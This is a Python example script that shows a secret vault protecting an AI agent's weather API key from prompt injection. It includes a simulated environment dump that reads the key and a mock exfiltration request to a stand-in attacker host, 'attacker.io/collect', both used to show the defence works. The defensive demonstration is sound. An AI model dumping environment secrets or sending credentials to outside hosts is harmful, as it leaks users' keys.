"""A LangChain-style get_weather tool: WITHOUT the vault vs WITH it.

Keeping the API key out of the *prompt* (the usual LangChain discipline) is not
enough once the agent also has a general-purpose tool (python/shell/http) or
faces prompt injection: the key still lives in os.environ and can be dumped.
Routing the tool's egress through Shield keeps the key out of the process
entirely - the env var holds only a reference, and Shield injects the real key
at the bound destination.

No network needed: the external weather call is represented by the outbound
request object, and we inspect what would go on the wire.

    PYTHONPATH=. python examples/secret_vault_langchain_weather.py
"""
import base64
import os

os.environ.setdefault("SECRET_VAULT_ENABLED", "true")
os.environ.setdefault("SECRET_VAULT_KEY_PROVIDER", "software")
os.environ.setdefault("SECRET_VAULT_KEK",
                      base64.b64encode(b"weather-demo-kek-weather-demo-32b").decode())

from core.openapi.upstream_call import UpstreamRequest      # noqa: E402
from core.secret_vault.materialize import materialize_request  # noqa: E402
from storage import vault_store as vault                    # noqa: E402

REAL = "wk-REAL-SECRET-123"                # fake stand-in for a real weather API key
WEATHER = "https://api.weather.com/v1/current"


def build_weather_request(api_key_value: str) -> UpstreamRequest:
    """What the get_weather tool builds for its outbound call. In LangChain this
    is the requests.get(..., headers={'Authorization': f'Bearer {key}'}) inside
    the @tool function."""
    return UpstreamRequest(
        method="GET", url=WEATHER, params={"city": "Dubai"},
        headers={"Authorization": f"Bearer {api_key_value}"}, json_body=None,
    )


def injected_env_dump() -> dict:
    """A general-purpose python/shell tool, or a prompt-injected one, reading env."""
    return dict(os.environ)


print("=" * 72)
print("WITHOUT the vault   (the real key lives in the agent process)")
print("=" * 72)
os.environ["WEATHER_API_KEY"] = REAL                    # dev puts the real key in env
key = os.environ["WEATHER_API_KEY"]                     # get_weather reads it
req = build_weather_request(key)
print("legit call header ->", req.headers["Authorization"])
print("injected env dump ->", injected_env_dump().get("WEATHER_API_KEY"),
      " <-- LEAK: a general-purpose/injected tool reads the real key")

print()
print("=" * 72)
print("WITH the vault      (only a reference lives in the process)")
print("=" * 72)
vault.create_vault_entry("me", "weather_key", REAL, bindings=["api.weather.com"])
os.environ["WEATHER_API_KEY"] = "shield://weather_key"  # env holds a reference
key = os.environ["WEATHER_API_KEY"]                     # get_weather reads the placeholder
req = build_weather_request(key)
print("before egress     ->", req.headers["Authorization"], "(placeholder)")
materialize_request("me", req)                          # Shield swaps at egress (bound host)
print("on the wire       ->", req.headers["Authorization"], "(real key, only to api.weather.com)")
print("injected env dump ->", injected_env_dump().get("WEATHER_API_KEY"),
      " <-- useless placeholder")

evil = build_weather_request("shield://weather_key")    # same reference, attacker host
evil.url = "https://attacker.io/collect"
materialize_request("me", evil)
print("exfil attempt     ->", evil.headers["Authorization"],
      "(never materialized off the bound host)")

# Regression guard: with the vault on, the process/env and any unbound
# destination must never expose the real key.
assert injected_env_dump().get("WEATHER_API_KEY") == "shield://weather_key"
assert "shield://weather_key" in evil.headers["Authorization"]
print("\nOK - with the vault the key stays out of the process and off unbound hosts")
